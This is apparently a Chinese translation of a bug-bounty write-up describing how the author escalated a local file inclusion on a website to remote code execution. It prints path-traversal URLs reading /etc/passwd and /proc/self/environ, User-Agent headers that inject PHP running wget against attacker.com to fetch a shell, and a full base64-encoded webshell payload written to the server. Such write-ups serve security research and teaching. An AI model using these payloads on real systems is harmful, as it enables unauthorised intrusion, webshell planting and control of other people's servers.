<html>
<head>
<title>Leveraging LFI to RCE in a website with +20000 users</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">在拥有+20000用户的网站中利用LFI到RCE</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/leveraging-lfi-to-rce-in-a-website-with-20000-users-129050f9982b?source=collection_archive---------0-----------------------#2020-10-04">https://infosecwriteups.com/leveraging-lfi-to-rce-in-a-website-with-20000-users-129050f9982b?source=collection_archive---------0-----------------------#2020-10-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9bb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">研究者和捕虫者们，你们好！最近我发现了一个有趣的攻击媒介，我想与你分享。别浪费时间，让我们开始吧。</p><h1 id="2b67" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">发现LFI漏洞</h1><p id="a78a" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">我们浏览一下网站，看看是否能找到什么有趣的端点。点击<strong class="jp ir">联系我们</strong>引出一个有趣的终点:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="7b86" class="lx km iq lt b gy ly lz l ma mb">https://www.website.com/index.php?pg=contact.php</span></pre><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mc"><img src="../Images/b3803dd2add8aa38cbaf3acbdea2d65b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3SuEkX6I9M8OzqVeI7qcjg.jpeg"/></div></div><figcaption class="mk ml gj gh gi mm mn bd b be z dk translated">contact.php</figcaption></figure><p id="e1df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我开始模糊化<em class="mo"> pg </em>参数，发现LFI可以使用以下有效载荷:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="627b" class="lx km iq lt b gy ly lz l ma mb">https://www.website.com/index.php?pg=../../../../etc/passwd</span></pre><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mc"><img src="../Images/6f1a0250613c0b99310608e9c1e00be8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zynj6J5e8JVPZXFOrZDuGQ.jpeg"/></div></div></figure><p id="072c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">到目前为止还不错，我们有LFI，但让我们试着增加影响。</p><h1 id="788e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">从LFI到RCE</h1><p id="aa18" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">使用所有可能的已知技术将一个LFI漏洞升级到RCE，我发现<strong class="jp ir"> /proc/self/environ </strong>对我们来说是可读的。因此，输入以下代码会泄露信息:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="69c8" class="lx km iq lt b gy ly lz l ma mb">https://www.website.com/index.php?pg=../../../../proc/self/environ</span></pre><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mp"><img src="../Images/54b28ff1e634653d693a626c264cfcbd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MTks9dkmMDHavDYew_rhKQ.jpeg"/></div></div></figure><p id="4769" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不错！分析输出，我们可以看到位于<strong class="jp ir"><em class="mo">/proc/self/environ</em></strong>下的文件包含了<strong class="jp ir"> HTTP_USER_AGENT </strong>等几个环境变量。</p><figure class="lo lp lq lr gt md gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/bf1d17be73b55d66855cbf00553f5095.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7zr1_BxEOG4YYhUrtWI27Q.jpeg"/></div></figure><p id="9cdb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很好，让我们启动Burp Suite，并通过更改用户代理值来发送请求。我尝试向用户代理添加以下值:</p><p id="58cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">试过系统()，但没有RCE: </strong></p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="9986" class="lx km iq lt b gy ly lz l ma mb">User-Agent: &lt;?system('wget http://attacker.com/shell.txt -O shell.php');?&gt;</span></pre><p id="77d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">尝试了exec()，但没有RCE: </strong></p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="c9a4" class="lx km iq lt b gy ly lz l ma mb">User-Agent: &lt;?exec('wget http://attacker.com/shell.txt -O shell.php');?&gt;</span></pre><p id="8d1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">尝试phpinit()，但失败:</strong></p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="6317" class="lx km iq lt b gy ly lz l ma mb">User-Agent: &lt;?php phpinfo(); ?&gt;</span></pre><p id="5fee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我花了很多时间的地方，我忘记了我可以尝试在服务器内部写文件，所以我尝试了下面的有效载荷(我会解释)。</p><p id="0782" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们创建一个有效负载，我们将在<strong class="jp ir">用户代理</strong> HTTP头中使用它:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="4cb3" class="lx km iq lt b gy ly lz l ma mb">User-Agent: &lt;?php $a = base64_decode('PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg=='); $file = fopen('nadeshot.php','w'); echo fwrite($file,$a); fclose($file); ?&gt;</span></pre><h2 id="4fca" class="lx km iq bd kn mr ms dn kr mt mu dp kv jy mv mw kz kc mx my ld kg mz na lh nb bi translated">解释使用的有效负载</h2><p id="10c2" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">webshell以base64编码，并存储在一个变量中。原webshell php代码来自:<a class="ae nc" href="https://github.com/alita-ido/PHP-File-Writer/blob/master/lfi-writer.php" rel="noopener ugc nofollow" target="_blank">https://github . com/alita-I do/PHP-File-Writer/blob/master/lfi-Writer . PHP</a></p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="fd6a" class="lx km iq lt b gy ly lz l ma mb">$a = base64_decode('webshell_base64_encoded_code_here');</span></pre><p id="e8ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，我们告诉服务器写一个名为<strong class="jp ir">nadeshot.php的文件。</strong></p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="22b3" class="lx km iq lt b gy ly lz l ma mb">$file = fopen('nadeshot.php','w');</span></pre><p id="29dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，服务器将代码(解码base64)写入<strong class="jp ir">nadeshot.php</strong></p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="3165" class="lx km iq lt b gy ly lz l ma mb">echo fwrite($file,$a);</span></pre><p id="cc41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，服务器将保存该文件:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="a3ca" class="lx km iq lt b gy ly lz l ma mb">fclose($file);</span></pre><p id="dc0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，让我们尝试在Burp Suite中执行整个有效负载，看看会发生什么。</p><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi mp"><img src="../Images/498d24bed88b1ec686b3c191bf1833b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fmd1oa_tnSy526j6WMmrig.jpeg"/></div></div></figure><p id="d4bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了响应200 (OK)，这很好。我们希望我们的有效载荷按计划执行，所以让我们通过访问:https://website.com/nadeshot.php来检查它是否成功执行</p><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi nd"><img src="../Images/5a575c16f845d9028c34036b11041bfe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qm5Uq8E8jJXe3T7L2CeTPQ.jpeg"/></div></div><figcaption class="mk ml gj gh gi mm mn bd b be z dk translated">webshell已上传</figcaption></figure><p id="db4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的webshell被上传到了<strong class="jp ir"> /nadeshot.php </strong>。很好，现在让我们写一个简单的。txt文件(尽量不伤害网站)看看有没有用。</p><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi ne"><img src="../Images/0d1899f1b5246ba5e00081e8bd2d1ef1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HGDKCUr9H90lBJFYqsdsmw.jpeg"/></div></div></figure><p id="33fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将创建一个名为<strong class="jp ir"> nadeshot.txt </strong>的文本文件，然后单击“写入”。</p><p id="1c4f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">进入<em class="mo">https://website.com/nadeshot.txt</em>将显示我们的文本文件。我们成功地扩大了从LFI到RCE的影响力。</p><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="me mf di mg bf mh"><div class="gh gi nf"><img src="../Images/f15427cac6b1adecc9d6346a7f1576e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NgNTZfoS2FRgau1fo9cfXA.jpeg"/></div></div><figcaption class="mk ml gj gh gi mm mn bd b be z dk translated">RCE实现了</figcaption></figure></div></div>    
</body>
</html>